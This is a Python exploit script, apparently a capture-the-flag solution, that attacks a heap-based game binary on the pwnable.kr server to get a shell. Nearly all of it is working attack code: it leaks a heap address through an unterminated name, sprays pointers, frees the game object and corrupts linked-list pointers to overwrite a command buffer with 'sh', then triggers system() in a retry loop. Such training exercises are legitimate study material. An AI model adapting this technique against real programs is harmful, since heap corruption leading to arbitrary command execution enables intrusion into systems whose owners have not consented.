"""
Warning - the pwned program is not determinstic, and so is the success
of this exploit. The probability success is NOT optimized (!). Many
things can break it, some of which I might have been able to mitigate.
But - I only needed a flag. I ran it twice, in the first try I got
a shell in the 31st round, and in the second - in the 55th.

Possible improvments include:
**** Optimize the number of items purchased to reach the end of the chunk
*** Automate success check (I did it but removed it, as I was afraid it
  is failing me)
** Make it python2.7 compatible so we can run it locally on the pwnable
  server
* Ensure we do not crash due to sync errors
* Ensure the exploit itself is logically correct and robust

Note that in a possible success you enter interactive mode - if you are
still stuck in the game UI, exit interactive mode and let the next try
round begin).
"""


from hexdump import hexdump
from pwn import *
from pwn import p32, u32
from typing import Union

from utils import NetcatClient


def adjust_send(conn, data: Union[str, bytes], adj: int) -> None:
    packet = data[:adj].ljust(adj)
    conn.send(packet)


INT_ADJ = 16
def send_int(conn, num: int) -> None:
    adjust_send(conn, str(num), INT_ADJ)


def craft_int_packet(num: int) -> str:
    data = str(num)
    return data[:INT_ADJ].ljust(INT_ADJ)


MONSTER_NAME_ADJ = 8
def send_monster_name(conn, name: str) -> None:
    adjust_send(conn, name, MONSTER_NAME_ADJ)


COMMAND_1337_ADJ = 20
def send_1337_command(conn, command: Union[str, bytes]) -> None:
    if isinstance(command, str):
        adjust_send(conn, command + '\0', COMMAND_1337_ADJ)
    else:
        adjust_send(conn, command + b'\0', COMMAND_1337_ADJ)


PLAYER_NAME_ADJ = 8
def send_player_name(conn, name: str) -> None:
    adjust_send(conn, name, PLAYER_NAME_ADJ)


def recv_until(conn, stop: str) -> bytes:
    stop = stop.encode()
    data = conn.recv()
    while not stop in data:
        data += conn.recv()
    return data


def do_we_have_shell(conn) -> bool:
    for i in range(10):
        data = conn.recv(timeout=0.5)
        if b'$' in data:
            return True
        if len(data) == 0:
            break
    return False


def try_exploit() -> bool:
    conn = NetcatClient(
        host='pwnable.kr',
        port=9029,
        verbose=False,
    )

    with conn:    
        # Initial greet
        conn.recv()
        send_player_name(conn, 'Nadav')
        conn.recv()


        # First step: leak the list struct's address
        send_int(conn, 3)  # "change player"
        conn.recv()
        send_player_name(conn, 'AAAAAAAA')  # Not null terminated username
        conn.recv()
        send_int(conn, 1337)
        conn.recv()
        send_1337_command(conn, 'black sheep wall')  # "You shall now have visual!!"
        data = recv_until(conn, 'AAAAAAAA')
        
        _start = data.find(b'AAAAAAAA') + 8
        my_list_struct_addr = int.from_bytes(data[_start:_start+4], 'little')
        log.info(f'my_list_struct_addr = {hex(my_list_struct_addr)}')


        # Second step - collect a pointer to a variable holding `my_list_struct_addr-8`
        _to_spray = my_list_struct_addr - 8
        send_int(conn, 1)  # Spawn a monster
        conn.recv()
        send_int(conn, 0)  # Experience: arbitrary
        conn.recv()
        send_int(conn, _to_spray)  # Sprayed body color
        conn.recv()
        send_monster_name(conn, 'Bobo')  # Name: arbitrary
        conn.recv()
        
        my_list_struct_addr_minus_8_ptr = my_list_struct_addr + 2000  # Fall on spray
        log.info(f'my_list_struct_addr_minus_8_ptr = {hex(my_list_struct_addr_minus_8_ptr)}')


        # Third step - setup `next` of the new item to be `&bash_command - 8`
        bash_command_addr = 0x0804B06C
        _to_spray = bash_command_addr - 8
        send_int(conn, 1)  # Spawn a monster
        conn.recv()
        send_int(conn, 0)  # Experience: arbitrary
        conn.recv()
        send_int(conn, _to_spray)  # Sprayed body color
        conn.recv()
        send_monster_name(conn, 'Momo')  # Name: arbitrary
        conn.recv()
        
        send_int(conn, 2)  # "Hunt the monster"; In my experiement - the free chunk's size is now 0x4019
        conn.recv()

        _num_items = 86
        many_items_packet = _num_items * (
            craft_int_packet(4) +  # "Buy an item"
            craft_int_packet(0)    # Item number: arbitrary
        )
        conn.send(many_items_packet)
        recv_until(conn, f'{_num_items} item created')
        

        # Fourth step - physically shorten the list
        send_int(conn, 1337)
        conn.recv()
        send_1337_command(conn, 'game over man')  # Free `g_game`
        conn.recv()
        send_int(conn, 1337)
        conn.recv()
        send_1337_command(conn, b'B' * 8 + p32(my_list_struct_addr_minus_8_ptr))
        conn.recv()
        send_int(conn, 4)  # "Buy an item"
        conn.recv()
        send_int(conn, 0)  # Item number: arbitrary
        conn.recv()
        send_int(conn, 1337)
        conn.recv()
        send_1337_command(conn, b'C' * 8 + p32(my_list_struct_addr))
        conn.recv()


        # Fifth stage - link the virual last item - `&bash_command-8` - to a new item having `sh`
        send_int(conn, 4)  # "Buy an item"
        conn.recv()
        
        send_int(conn, u32(b'sh\0\0'))  # Item number: 'sh\0\0'
        conn.recv()

        # Final stage - trigger bash command
        send_int(conn, 1337)
        conn.recv()
        send_1337_command(conn, 'power overwhelming')  # `system(bash_command)`

        conn.interactive()

        # if do_we_have_shell(conn):
        #     conn.interactive()
        #     return True
        # else:
        #     return False


def main():
    done = False
    round_nr = 0
    while not done:
        round_nr += 1
        print()
        print('=================================================')
        print(f'Round {round_nr}')
        print('-------------------------------------------------')
        try:
            done = try_exploit()
        except EOFError:
            done = False
            print('Got EOFError')
        if not done:
            print('No shell :(')
        print('Continuing to next round')
        print('=================================================')
        print()


if __name__ == '__main__':
    main()
